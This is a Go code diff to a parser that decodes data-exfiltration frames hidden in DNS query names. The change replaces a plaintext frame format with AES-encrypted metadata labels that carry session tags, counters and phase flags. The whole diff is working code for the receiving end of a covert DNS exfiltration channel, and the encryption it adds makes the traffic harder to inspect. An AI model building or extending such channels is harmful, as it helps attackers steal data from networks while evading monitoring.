@@ -4,7 +4,6 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
-	"strconv"
 	"strings"
 )
 
@@ -69,6 +68,14 @@ type ExfilFrame struct {
 	SessionTag string
 	Counter    uint32
 	Payload    string
+	Flags      uint8
+}
+
+type frameEnvelope struct {
+	Version    uint8
+	Flags      uint8
+	SessionTag string
+	Counter    uint32
 }
 
 // IsHeader reports whether the metadata represents the header frame.
@@ -167,7 +174,7 @@ func parseExfilMetadataPayload(payload []byte) (*ExfilMetadata, error) {
 	return meta, nil
 }
 
-func parseLabelEncodedExfilFrame(qname string, domains []string) (*ExfilFrame, bool, error) {
+func parseLabelEncodedExfilFrame(qname string, domains []string, aesKey []byte) (*ExfilFrame, bool, error) {
 	normalizedName := strings.TrimSuffix(strings.ToLower(qname), ".")
 	if normalizedName == "" {
 		return nil, false, nil
@@ -186,91 +193,104 @@ func parseLabelEncodedExfilFrame(qname string, domains []string) (*ExfilFrame, b
 		}
 
 		frameLabels := append([]string(nil), nameParts[:len(nameParts)-len(domainParts)]...)
-		if len(frameLabels) == 0 {
+		if len(frameLabels) < 2 {
 			continue
 		}
 
 		if last := frameLabels[len(frameLabels)-1]; isLikelyTimestampLabel(last) {
 			frameLabels = frameLabels[:len(frameLabels)-1]
 		}
-		if len(frameLabels) == 0 {
+		if len(frameLabels) < 2 {
 			continue
 		}
 
-		var builder strings.Builder
-		for _, label := range frameLabels {
-			if label == "" {
-				continue
-			}
-			builder.WriteString(label)
-		}
-		if builder.Len() == 0 {
-			continue
-		}
-
-		frameString := strings.ToUpper(builder.String())
-		if !strings.HasPrefix(frameString, ExfilFramePrefix) {
-			continue
-		}
-
-		frame, err := interpretExfilFrameString(frameString)
+		frame, err := interpretEncryptedFrameLabels(frameLabels, aesKey)
 		return frame, true, err
 	}
 
 	return nil, false, nil
 }
 
-func interpretExfilFrameString(frame string) (*ExfilFrame, error) {
-	parts := strings.Split(frame, "-")
-	if len(parts) < 3 {
-		return nil, fmt.Errorf("incomplete exfil frame: %s", frame)
-	}
-	if parts[0] != "EX" {
-		return nil, nil
+func interpretEncryptedFrameLabels(labels []string, aesKey []byte) (*ExfilFrame, error) {
+	if len(labels) != 2 {
+		return nil, fmt.Errorf("expected 2 labels, got %d", len(labels))
 	}
 
-	sessionTag := strings.ToUpper(parts[1])
-	if len(sessionTag) != ExfilSessionTagWidth {
-		return nil, fmt.Errorf("invalid session tag length: %s", sessionTag)
+	metaLabel := labels[0]
+	payloadLabel := labels[1]
+	upperMeta := strings.ToUpper(metaLabel)
+	if !strings.HasPrefix(upperMeta, ExfilMetadataPrefix) {
+		return nil, fmt.Errorf("label missing exfil prefix")
 	}
-	if !strings.HasPrefix(sessionTag, ExfilSessionTagPrefix) {
-		return nil, fmt.Errorf("invalid session tag prefix: %s", sessionTag)
+	encoded := metaLabel[len(ExfilMetadataPrefix):]
+	if encoded == "" {
+		return nil, fmt.Errorf("metadata label missing ciphertext")
 	}
 
-	completionToken := strings.ToUpper(ExfilCompleteToken)
+	plaintext, err := decodeAndDecryptBytes(encoded, aesKey)
+	if err != nil {
+		return nil, fmt.Errorf("failed to decrypt metadata label: %w", err)
+	}
+	envelope, err := parseFrameEnvelopePayload(plaintext)
+	if err != nil {
+		return nil, err
+	}
+
+	frame := &ExfilFrame{
+		SessionTag: envelope.SessionTag,
+		Counter:    envelope.Counter,
+		Flags:      envelope.Flags,
+	}
+
 	switch {
-	case len(parts) == 3 && strings.ToUpper(parts[2]) == completionToken:
-		return &ExfilFrame{Phase: ExfilFrameComplete, SessionTag: sessionTag}, nil
-	case len(parts) == 3:
-		counter, err := parseBase36Counter(parts[2])
-		if err != nil {
-			return nil, err
-		}
-		return &ExfilFrame{Phase: ExfilFrameInit, SessionTag: sessionTag, Counter: counter}, nil
+	case envelope.Flags&FrameEnvelopeFlagInit != 0:
+		frame.Phase = ExfilFrameInit
+	case envelope.Flags&FrameEnvelopeFlagComplete != 0:
+		frame.Phase = ExfilFrameComplete
+	case envelope.Flags&FrameEnvelopeFlagChunk != 0:
+		frame.Phase = ExfilFrameChunk
 	default:
-		counter, err := parseBase36Counter(parts[2])
-		if err != nil {
-			return nil, err
-		}
-		payload := strings.Join(parts[3:], "-")
-		if payload == "" {
-			return nil, fmt.Errorf("chunk frame missing payload")
-		}
-		return &ExfilFrame{
-			Phase:      ExfilFrameChunk,
-			SessionTag: sessionTag,
-			Counter:    counter,
-			Payload:    payload,
-		}, nil
+		return nil, fmt.Errorf("envelope missing phase flag (flags=0x%x)", envelope.Flags)
 	}
+
+	payload := strings.ToLower(payloadLabel)
+	if payload == strings.ToLower(ExfilPadLabel) {
+		payload = ""
+	}
+	if frame.Phase == ExfilFrameChunk {
+		if payload == "" {
+			return nil, fmt.Errorf("chunk frame missing payload label")
+		}
+		if !isBase36Label(payload) {
+			return nil, fmt.Errorf("chunk payload label is not base36")
+		}
+		frame.Payload = payload
+	} else {
+		frame.Payload = payload
+	}
+
+	return frame, nil
 }
 
-func parseBase36Counter(token string) (uint32, error) {
-	value, err := strconv.ParseUint(strings.ToLower(token), 36, 32)
-	if err != nil {
-		return 0, fmt.Errorf("invalid base36 counter %q: %w", token, err)
+func parseFrameEnvelopePayload(payload []byte) (*frameEnvelope, error) {
+	minLen := 1 + 1 + FrameEnvelopeTagLength + 4
+	if len(payload) < minLen {
+		return nil, fmt.Errorf("envelope too short (%d bytes)", len(payload))
 	}
-	return uint32(value), nil
+	env := &frameEnvelope{
+		Version:    payload[0],
+		Flags:      payload[1],
+		SessionTag: string(payload[2 : 2+FrameEnvelopeTagLength]),
+		Counter:    binary.LittleEndian.Uint32(payload[2+FrameEnvelopeTagLength : 2+FrameEnvelopeTagLength+4]),
+	}
+	if env.Version != FrameEnvelopeVersion {
+		return nil, fmt.Errorf("unsupported envelope version %d", env.Version)
+	}
+	if len(env.SessionTag) != ExfilSessionTagWidth || !strings.HasPrefix(env.SessionTag, ExfilSessionTagPrefix) {
+		return nil, fmt.Errorf("invalid session tag %q", env.SessionTag)
+	}
+	env.SessionTag = strings.ToUpper(env.SessionTag)
+	return env, nil
 }
 
 // extractExfilPayloadFromQName removes the configured domain/timestamp labels and returns the base36 blob.
